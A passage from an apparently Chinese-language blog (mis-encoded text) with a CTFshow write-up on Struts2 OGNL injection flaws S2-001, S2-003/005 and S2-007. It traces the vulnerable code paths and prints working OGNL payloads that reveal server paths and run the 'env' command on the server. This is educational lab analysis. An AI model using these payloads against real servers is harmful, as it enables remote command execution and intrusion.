<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªè½¬æ¢å™¨å¯ä»¥å°†å†…å®¹ä»ä»»æ„ä¸€ä¸ªç¼–ç è½¬æ¢ä¸ºå¦ä¸€ç§ç¼–ç ï¼Œ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d" >https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="æ–‡ä»¶ä¸Šä¼ "   >
          <a href="#æ–‡ä»¶ä¸Šä¼ " class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2>
      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/efe011ec.html">CTFshowJava</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-08-29</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/efe011ec.html" data-flag-title="CTFshowJava"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="CTFshow-Java"   >
          <a href="#CTFshow-Java" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTFshow-Java" class="headerlink" title="CTFshow Java"></a>CTFshow Java</h1>
      <p>å…¨éƒ¨é¢˜éƒ½æ˜¯struts2<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020" >æ¡†æ¶</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>æ¼æ´</p>
<p>Struts2æ˜¯ç”¨Javaè¯­è¨€ç¼–å†™çš„ä¸€ä¸ªåŸºäº<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=MVC&spm=1001.2101.3001.7020" >MVC</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>è®¾è®¡æ¨¡å¼çš„Webåº”ç”¨æ¡†æ¶</p>
<p>æ³¨æ„ä»¥ä¸‹æ‰€æœ‰æ¼æ´éƒ½å¯ä»¥ç›´æ¥åˆ©ç”¨å…¬å¼€çš„è„šæœ¬è¿›è¡Œä¸€é”®åˆ©ç”¨</p>
<p>é¦–å…ˆè¦äº†è§£ä¸€ä¸‹OGNLä¸­çš„ç‰¹æ®Šç¬¦å·ä½œç”¨</p>
<blockquote>
<ul>
<li><code>%</code>çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œè®¡ç®—OGNLè¡¨è¾¾å¼%{}ä¸­çš„å€¼</li>
<li><code>#</code>çš„ç”¨é€”è®¿ä¸»è¦æ˜¯è®¿é—®éæ ¹å¯¹è±¡å±æ€§ï¼Œå› ä¸ºStruts 2ä¸­å€¼æ ˆè¢«è§†ä¸ºæ ¹å¯¹è±¡ï¼Œæ‰€ä»¥è®¿é—®å…¶ä»–éæ ¹å¯¹è±¡æ—¶ï¼Œéœ€è¦åŠ #å‰ç¼€æ‰å¯ä»¥è°ƒç”¨</li>
<li><code>$</code>ä¸»è¦æ˜¯åœ¨Struts 2é…ç½®æ–‡ä»¶ä¸­ï¼Œå¼•ç”¨OGNLè¡¨è¾¾å¼</li>
</ul>
</blockquote>
<p>å…³äºOGNLè¯­è¨€çš„ä»‹ç»å¯ä»¥çœ‹<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" >è¿™é‡Œ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼Œåœ¨è¿™é‡Œå¯ä»¥è¿›è¡Œåˆ©ç”¨æ˜¯å› ä¸ºstrutså°†å…¶ä½œä¸ºé»˜è®¤è¯­è¨€</p>
<p>åˆ¤æ–­é¡µé¢æ˜¯å¦åŸºäºStruts2ï¼š</p>
<ul>
<li>é€šè¿‡é¡µé¢å›æ˜¾çš„é”™è¯¯æ¶ˆæ¯æ¥åˆ¤æ–­ï¼Œé¡µé¢ä¸å›æ˜¾é”™è¯¯æ¶ˆæ¯æ—¶åˆ™æ— æ•ˆ</li>
<li>é€šè¿‡ç½‘é¡µåç¼€æ¥åˆ¤æ–­ï¼Œå¦‚.do .actionï¼Œæœ‰å¯èƒ½ä¸å‡†<ul>
<li>å¦‚æœé…ç½®æ–‡ä»¶ä¸­å¸¸æ•°extensionçš„å€¼ä»¥é€—å·ç»“å°¾æˆ–è€…æœ‰ç©ºå€¼ï¼ŒæŒ‡æ˜äº†actionå¯ä»¥ä¸å¸¦åç¼€ï¼Œé‚£ä¹ˆä¸å¸¦åç¼€çš„uriä¹Ÿå¯èƒ½æ˜¯struts2æ¡†æ¶æ­å»ºçš„</li>
<li>å¦‚æœä½¿ç”¨Struts2çš„restæ’ä»¶ï¼Œå…¶é»˜è®¤çš„struts-plugin.xmlæŒ‡å®šçš„è¯·æ±‚åç¼€ä¸ºxhtml,xmlå’Œjson</li>
</ul>
</li>
<li>åˆ¤æ–­ /struts/webconsole.html æ˜¯å¦å­˜åœ¨æ¥è¿›è¡Œåˆ¤æ–­ï¼Œéœ€è¦ devMode ä¸º true</li>
</ul>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan" >è„šæœ¬é“¾æ¥</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="ValueStack"   >
          <a href="#ValueStack" class="heading-link"><i class="fas fa-link"></i></a><a href="#ValueStack" class="headerlink" title="ValueStack"></a>ValueStack</h2>
      <p>åé¢ä¼šé«˜é¢‘å‡ºç°çš„ä¸€ä¸ªä¸œè¥¿ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹</p>
<p>é¦–å…ˆStruts2çš„è¿è¡Œæµç¨‹æ˜¯ï¼ˆåé¢çš„å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯åŸºäºè¿™ä¸ªæµç¨‹åˆ†æçš„ï¼‰</p>
<p><img src="https://taomujian.github.io/img/S2-008/images/%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="æµç¨‹å›¾"></p>
<ol>
<li><p>HTTPè¯·æ±‚ç»è¿‡ä¸€ç³»åˆ—çš„æ ‡å‡†è¿‡æ»¤å™¨(Filter)ç»„ä»¶é“¾(è¿™äº›æ‹¦æˆªå™¨å¯ä»¥æ˜¯Struts2 è‡ªå¸¦çš„,ä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„,æœ¬ç¯å¢ƒä¸­struts.xmlä¸­çš„packageç»§æ‰¿è‡ªstruts-default,struts-defaultå°±ä½¿ç”¨äº†Struts2è‡ªå¸¦çš„æ‹¦æˆªå™¨.ActionContextCleanUpä¸»è¦æ˜¯æ¸…ç†å½“å‰çº¿ç¨‹çš„ActionContextã€Dispatcher,FilterDispatcherä¸»è¦æ˜¯é€šè¿‡ActionMapperæ¥å†³å®šéœ€è¦è°ƒç”¨é‚£ä¸ªAction,FilterDispatcheræ˜¯æ§åˆ¶å™¨çš„æ ¸å¿ƒ,ä¹Ÿæ˜¯MVCä¸­æ§åˆ¶å±‚çš„æ ¸å¿ƒç»„ä»¶),æœ€ååˆ°è¾¾FilterDispatcherè¿‡æ»¤å™¨.</p>
</li>
<li><p>æ ¸å¿ƒæ§åˆ¶å™¨ç»„ä»¶FilterDispatcheræ ¹æ®ActionMapperä¸­çš„è®¾ç½®ç¡®å®šæ˜¯å¦éœ€è¦è°ƒç”¨æŸä¸ªActionç»„ä»¶æ¥å¤„ç†è¿™ä¸ªHttpServletRequestè¯·æ±‚,å¦‚æœActionMapperå†³å®šè°ƒç”¨æŸä¸ªActionç»„ä»¶,FilterDispatcheræ ¸å¿ƒæ§åˆ¶å™¨ç»„ä»¶å°±ä¼šæŠŠè¯·æ±‚çš„å¤„ç†æƒå§”æ‰˜ç»™ActionProxyç»„ä»¶.</p>
</li>
<li><p>ActionProxyç»„ä»¶é€šè¿‡Configuration Managerç»„ä»¶è·å–Struts2æ¡†æ¶çš„é…ç½®æ–‡ä»¶struts.xml,æœ€åæ‰¾åˆ°éœ€è¦è°ƒç”¨çš„ç›®æ ‡Actionç»„ä»¶ç±»,ç„¶åActionProxyç»„ä»¶å°±åˆ›å»ºå‡ºä¸€ä¸ªå®ç°äº†å‘½ä»¤æ¨¡å¼çš„ActionInvocationç±»çš„å¯¹è±¡å®ä¾‹ç±»çš„å¯¹è±¡å®ä¾‹(è¿™ä¸ªè¿‡ç¨‹åŒ…æ‹¬è°ƒç”¨Anctionç»„ä»¶æœ¬èº«ä¹‹å‰è°ƒç”¨å¤šä¸ªçš„æ‹¦æˆªå™¨ç»„ä»¶çš„before()æ–¹æ³•)åŒæ—¶ActionInvocationç»„ä»¶é€šè¿‡ä»£ç†æ¨¡å¼è°ƒç”¨ç›®æ ‡Actionç»„ä»¶.ä½†æ˜¯åœ¨è°ƒç”¨ä¹‹å‰ActionInvocationç»„ä»¶ä¼šæ ¹æ®é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®é¡¹ç›®åŠ è½½ä¸ç›®æ ‡Actionç»„ä»¶ç›¸å…³çš„æ‰€æœ‰æ‹¦æˆªå™¨ç»„ä»¶(Interceptor)</p>
</li>
<li><p>ä¸€æ—¦Actionç»„ä»¶æ‰§è¡Œå®Œæ¯•,ActionInvocationç»„ä»¶å°†æ ¹æ®å¼€å‘äººå‘˜åœ¨Struts2.xmlé…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„å„ä¸ªé…ç½®é¡¹ç›®è·å¾—å¯¹è±¡çš„è¿”å›ç»“æœ,è¿™ä¸ªè¿”å›ç»“æœæ˜¯è¿™ä¸ªActionç»„ä»¶çš„ç»“æœç (æ¯”å¦‚SUCCESSã€INPUT),ç„¶åæ ¹æ®è¿”å›çš„è¯¥ç»“æœè°ƒç”¨ç›®æ ‡JSPé¡µé¢ä»¥å®ç°æ˜¾ç¤ºè¾“å‡º.</p>
</li>
<li><p>æœ€åå„ä¸ªæ‹¦æˆªå™¨ç»„ä»¶ä¼šè¢«å†æ¬¡æ‰§è¡Œ(ä½†æ˜¯é¡ºåºå’Œå¼€å§‹æ—¶ç›¸å,å¹¶è°ƒç”¨after()æ–¹æ³•),ç„¶åè¯·æ±‚æœ€ç»ˆè¢«è¿”å›ç»™ç³»ç»Ÿçš„éƒ¨ç½²æ–‡ä»¶ä¸­é…ç½®çš„å…¶ä»–è¿‡æ»¤å™¨,å¦‚æœå·²ç»è®¾ç½®äº†ActionContextCleanUpè¿‡æ»¤å™¨,é‚£ä¹ˆFilterDispatcherå°±ä¸ä¼šæ¸…ç†åœ¨ThreadLocalå¯¹è±¡ä¸­ä¿å­˜çš„ActionContextä¿¡æ¯.å¦‚æœæ²¡æœ‰è®¾ç½®ActionContextCleanUpè¿‡æ»¤å™¨,FilterDispatcherå°±ä¼šæ¸…é™¤æ‰æ‰€æœ‰çš„ThreadLocalå¯¹è±¡.</p>
</li>
</ol>

        <h2 id="279"   >
          <a href="#279" class="heading-link"><i class="fas fa-link"></i></a><a href="#279" class="headerlink" title="279"></a>279</h2>
      <p>æ¼æ´ï¼šS2-001</p>
<p>æ¼æ´æˆå› ï¼šå½“ç”¨æˆ·æäº¤è¡¨å•æ•°æ®ä¸”éªŒè¯å¤±è´¥æ—¶ï¼ŒæœåŠ¡å™¨ä½¿ç”¨OGNLè¡¨è¾¾å¼è§£æç”¨æˆ·å…ˆå‰æäº¤çš„å‚æ•°å€¼ï¼Œ%{value}å¹¶é‡æ–°å¡«å……ç›¸åº”çš„è¡¨å•æ•°æ®</p>
<p>å½±å“ç‰ˆæœ¬ï¼šWebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p>
<p>æ¼æ´åˆ†æï¼š</p>
<ol>
<li><p>é¦–å…ˆæ–­ç‚¹æ‰“åœ¨æ¥å—å‚æ•°å¹¶éªŒè¯çš„åœ°æ–¹ï¼Œè¿›è€Œè·Ÿè¿›è§¦å‘ç‚¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100121467.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100124296.png"></p>
</li>
<li><p>ç”±äºéªŒè¯å¤±è´¥å¯¼è‡´è¿”å›errorè¿›è¡Œæ¸²æŸ“ï¼ŒæŸ¥çœ‹å¯¹<code>&lt;s:textfield&gt;</code>æ ‡ç­¾çš„æ¸²æŸ“è§„åˆ™</p>
<blockquote>
<p>jspæ–‡ä»¶ä¸­é‡åˆ°Struts2æ ‡ç­¾ &lt;s:textfield æ—¶ç¨‹åºä¼šå…ˆè°ƒç”¨ doStartTag,å¹¶å°†æ ‡ç­¾ä¸­çš„å±æ€§è®¾ç½®åˆ°TextFieldTagå¯¹è±¡ç›¸åº”å±æ€§ä¸­.åœ¨é‡åˆ° /&gt; ç»“æŸæ ‡ç­¾çš„æ—¶å€™è°ƒç”¨doEndTagæ–¹æ³•</p>
</blockquote>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100126720.png"></p>
</li>
<li><p>ç›´æ¥åœ¨æ¸²æŸ“å‡½æ•°å¤„æ‰“æ–­ç‚¹ï¼Œåœ¨<code>org.apache.struts2.views.jsp.ComponentTagSupport</code>ä¸­æ‰¾åˆ°ä¸Šè¿°æåˆ°çš„ä¸¤ä¸ªå‡½æ•°<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100129583.png"></p>
</li>
<li><p>è·Ÿè¿›endæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›evaluateParamsæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸ªæ–¹æ³•ä¸­å¦‚æœå¼€å¯äº†altSyntaxï¼Œé‚£ä¹ˆå°±ä¼šåœ¨nameå±æ€§çš„å­—æ®µä¸¤è¾¹æ·»åŠ OGNLè¡¨è¾¾å¼å­—ç¬¦ç”Ÿæˆexprå±æ€§ï¼Œæ­¥è¿‡æ‰§è¡Œå‘ç°exprå†…å®¹ç¡®å®è¢«æ”¹å˜<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100134657.png"></p>
</li>
<li><p>ç»§ç»­è·Ÿè¿›findValueæ–¹æ³•ï¼Œåœ¨è¿™é‡Œå°±èƒ½çœ‹åˆ°å‡ºé—®é¢˜çš„ç‚¹äº†ï¼Œå°±æ˜¯translateVariablesæ–¹æ³•<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100141364.png"></p>
</li>
<li><p>æ­¥å…¥åå‘ç°å…¶åˆè°ƒç”¨äº†åŒåé‡è½½æ–¹æ³•ï¼Œç›´æ¥çœ‹é‡è½½åçš„å‡½æ•°å†…å®¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100144830.png"></p>
<blockquote>
<p>ç¬¬ä¸€æ¬¡è·å–oçš„å€¼,è¿™é‡Œçš„stackä¸ºOgnlValueStack,å®ƒæ˜¯ValueStackçš„å®ç°ç±».ValueStackæ˜¯Struts2çš„ä¸€ä¸ªæ¥å£,è¡¨é¢æ„ä¹‰ä¸ºå€¼æ ˆ,ç±»ä¼¼äºä¸€ä¸ªæ•°æ®ä¸­è½¬ç«™,Struts2çš„æ•°æ®éƒ½ä¼šä¿å­˜åœ¨ValueStackä¸­.Struts2åœ¨å‘èµ·è¯·æ±‚åˆ›å»ºActionå®ä¾‹çš„åŒæ—¶ä¼šåˆ›å»ºä¸€ä¸ªOgnlValueStackå€¼æ ˆå®ä¾‹.Struts2ä½¿ç”¨OGNLå°†è¯·æ±‚Actionçš„å‚æ•°å°è£…ä¸ºå¯¹è±¡å­˜å‚¨åˆ°å€¼æ ˆä¸­,å¹¶é€šè¿‡OGNLè¡¨è¾¾å¼è¯»å–å€¼æ ˆä¸­çš„å¯¹è±¡å±æ€§å€¼.</p>
<p>ValueStackä¸­æœ‰ä¸¤ä¸ªä¸»è¦åŒºåŸŸ:</p>
<p>â€‹    CompoundRootåŒºåŸŸ:æ˜¯ä¸€ä¸ªArrayList,å­˜å‚¨äº†Actionå®ä¾‹,å®ƒä½œä¸ºOgnlContextçš„Rootå¯¹è±¡.è·å–rootæ•°æ®ä¸éœ€è¦åŠ #</p>
<p>â€‹    contextåŒºåŸŸ:å³OgnlContextä¸Šä¸‹æ–‡,æ˜¯ä¸€ä¸ªMap,æ”¾ç½®webå¼€å‘å¸¸ç”¨çš„å¯¹è±¡æ•°æ®çš„å¼•ç”¨.requestã€sessionã€parametersã€applicationç­‰.è·å–contextæ•°æ®éœ€è¦åŠ #</p>
<p>æ“ä½œå€¼æ ˆ,é€šå¸¸æŒ‡çš„æ˜¯æ“ä½œValueStackä¸­çš„rootåŒºåŸŸ.</p>
<p>OgnlValueStackçš„findValueæ–¹æ³•å¯ä»¥åœ¨CompoundRootä¸­ä»æ ˆé¡¶å‘æ ˆåº•æ‰¾æŸ¥æ‰¾å¯¹è±¡çš„å±æ€§å€¼</p>
</blockquote>
<p>ä»¥ä¸Šä¸ºå¤§ä½¬è§£æçš„stackå˜é‡çš„å†…å®¹ï¼Œä¸ç®¡å¦‚ä½•ï¼Œæˆ‘ä»¬ç›´æ¥è·Ÿè¿›åˆ°55è¡Œçš„stackçš„findValueæ–¹æ³•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¼ å…¥çš„å‚æ•°å†…å®¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100206870.png">ç»§ç»­æ­¥å…¥åˆ°<code>OgnlUtil.getValue</code>æ–¹æ³•ä¸­ï¼Œç»§ç»­æ­¥å…¥åˆ°<code>Ognl.getValue</code>æ–¹æ³•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶å¯¹nameå‚æ•°è¿›è¡Œäº†compileæ“ä½œå¹¶è¿”å›ä¼ å…¥çš„getValueæ–¹æ³•ï¼Œå°†usernameä¸­çš„å†…å®¹å–å‡ºå¹¶æ‰§è¡Œå…¶ä¸­çš„OGNLè¡¨è¾¾å¼<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215156.png">å¦‚æ­¤åå¤å¯ä»¥çœ‹åˆ°æœ€åOGNLè¡¨è¾¾å¼è¢«æˆåŠŸæ‰§è¡Œå¹¶ä¸”ç»“æœå­˜å…¥äº†resultä¸­<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215768.png"></p>
</li>
</ol>
<p>payloadï¼š</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–tomcatè·¯å¾„</span></span><br><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–webè·¯å¾„</span></span><br><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘½ä»¤æ‰§è¡Œ envï¼Œflagå°±åœ¨å…¶ä¸­</span></span><br><span class="line">%&#123;#a=(<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> java.io.InputStreamReader(#b),#d=<span class="keyword">new</span> java.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="280"   >
          <a href="#280" class="heading-link"><i class="fas fa-link"></i></a><a href="#280" class="headerlink" title="280"></a>280</h2>
      <p>æ¼æ´ï¼šS2-003 S2-005 <em>CVE-2008-6504</em></p>
<p>æ¼æ´æˆå› ï¼š</p>
<ul>
<li>S2-003æˆå› æ˜¯Struts2å°†HTTPçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºognlè¯­å¥æ‰§è¡Œï¼Œè€Œognlè¡¨è¾¾å¼æ˜¯é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼ŒStruts2æ¡†æ¶è™½ç„¶è¿‡æ»¤äº†#æ¥è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡unicodeç¼–ç ï¼ˆu0023ï¼‰æˆ–8è¿›åˆ¶ï¼ˆ43ï¼‰ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œè¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœ</li>
<li>S2-005çš„åŸç†å’ŒS2-003åŸºæœ¬ç›¸ä¼¼ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥ç»•è¿‡å®˜æ–¹çš„å®‰å…¨é…ç½®ï¼ˆç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œï¼‰ï¼Œå†æ¬¡é€ æˆçš„æ¼æ´ï¼Œå¯ä»¥è¯´æ˜¯å‡çº§ç‰ˆçš„S2-005æ˜¯å‡çº§ç‰ˆçš„S2-003</li>
</ul>
<p>å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.1.8.1</p>
<p>æ¼æ´åˆ†æï¼š</p>
<ol>
<li>é¦–å…ˆè§¦å‘ç‚¹<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor</code>ï¼Œå¯ä»¥çœ‹åˆ°é»˜è®¤çš„<code>denyMethodExecution</code>å€¼æ˜¯trueï¼Œæ”¹ä¸ºfalseæ‰èƒ½ç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥payloadä¸­éƒ¨åˆ†å†…å®¹æ˜¯è¦å°†å…¶æ”¹ä¸ºfalseçš„<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111446997.png"></li>
<li>æŸ¥çœ‹æ‰§è¡Œpayloadåå…¶ä¸­è·å–çš„å‚æ•°<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111447204.png"></li>
<li>æ­¥å…¥setParameterså‡½æ•°ï¼Œå‡½æ•°é€šè¿‡è¿­ä»£å™¨å°†å‚æ•°é€ä¸ªå–å‡º<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111450215.png"></li>
<li>æ­¥å…¥acceptableNameå‡½æ•°ï¼Œç»§ç»­æ­¥å…¥isAcceptedå‡½æ•°<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111455764.png"></li>
<li>å¯ä»¥çœ‹åˆ°æ­¤å¤„çš„æ­£åˆ™è¡¨è¾¾å¼åªæ˜¯ç®€å•çš„å¯¹#è¿›è¡Œäº†è¿‡æ»¤å¹¶æ²¡æœ‰è¿‡æ»¤unicodeå­—ç¬¦ï¼Œæœ€ç»ˆæ‰§è¡Œç»“æŸè¿”å›å­—ç¬¦ä¸²ä½¿å¾—åˆ¤å®šä¸ºçœŸ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111501736.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111459231.png"></li>
<li>ä¸‹ä¸€æ­¥ç»§ç»­è·Ÿè¿›stackçš„setValueæ–¹æ³•<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111556550.png"></li>
<li>å‘ç°å…¶åˆè°ƒç”¨äº†åŒåçš„é‡è½½æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›<code>OgnlUtil.setValue</code><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111605549.png"></li>
<li>è·Ÿå…¥compileæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥parseExpressionæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥topLevelExpressionæ–¹æ³•ï¼Œç»§ç»­è¿›å…¥expressionï¼Œç»è¿‡ä¸€ç³»åˆ—æ“ä½œåæœ€ç»ˆè§£æåˆ°<code>ognl.JavaCharStream#readChar</code>å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111607140.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111610477.png"></li>
<li>å¯ä»¥çœ‹åˆ°å…¶å¯¹\uç±»å‹çš„å­—ç¬¦è¿›è¡Œäº†ä¸“é—¨çš„è§£æï¼Œå°†å…¶è½¬åŒ–ä¸ºæ­£å¸¸å­—ç¬¦ï¼Œå¯¼è‡´OGNLè¡¨è¾¾å¼æ‰§è¡Œ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111615029.png"></li>
</ol>

        <h2 id="281"   >
          <a href="#281" class="heading-link"><i class="fas fa-link"></i></a><a href="#281" class="headerlink" title="281"></a>281</h2>
      <p>æ¼æ´ï¼šS2-007 <em>CVE-2012-0838</em></p>
<p>æ¼æ´æˆå› ï¼šåœ¨Struts2ä¸­,å¯ä»¥å°†HTTPè¯·æ±‚æ•°æ®æ³¨å…¥åˆ°å®é™…ä¸šåŠ¡Actionçš„å±æ€§ä¸­,è¿™äº›å±æ€§å¯ä»¥æ˜¯ä»»æ„ç±»å‹çš„æ•°æ®,é€šè¿‡HTTPåªèƒ½è·å–åˆ°Stringç±»å‹æ•°æ®,Struts2ä¸­é»˜è®¤æœ‰ä¸€ä¸ªç±»å‹è½¬æ¢å™¨,å¯ä»¥å®Œæˆå¤§éƒ¨åˆ†çš„è‡ªåŠ¨è½¬æ¢æ“ä½œ,å¯ä»¥é€šè¿‡xmlæ–‡ä»¶,æ¥å®šä¹‰è½¬æ¢è§„åˆ™.æ¯”å¦‚Actionç±»ä¸­æœ‰ä¸€ä¸ªintegerå±æ€§,ä¸éœ€è¦æ‰§è¡Œä»»ä½•æ“ä½œ,Strutsä¼šè‡ªåŠ¨å°†è¯·æ±‚å‚æ•°è½¬æ¢ä¸ºintegerå±æ€§.å½“é…ç½®äº†Validationæ—¶,è‹¥ç±»å‹è½¬æ¢å‡ºé”™,åç«¯é»˜è®¤ä¼šå°†ç”¨æˆ·æäº¤çš„è¡¨å•å€¼é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥,ç„¶åæ‰§è¡Œä¸€æ¬¡OGNLè¡¨è¾¾å¼è§£æå¹¶è¿”å›,ä»è€Œå¯ä»¥æ„é€ ç‰¹æ®Šçš„æ¶æ„è¯·æ±‚æ¥æ‰§è¡Œå‘½ä»¤.è¿™ç§åˆ©ç”¨æ–¹å¼å’ŒS2-001çš„å¾ˆç›¸ä¼¼,ä¸åŒçš„æ˜¯åˆ©ç”¨ç‚¹ä¸åŒ.</p>
<p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.2.3</p>
<p>æ¼æ´åˆ†æï¼š</p>
<ol>
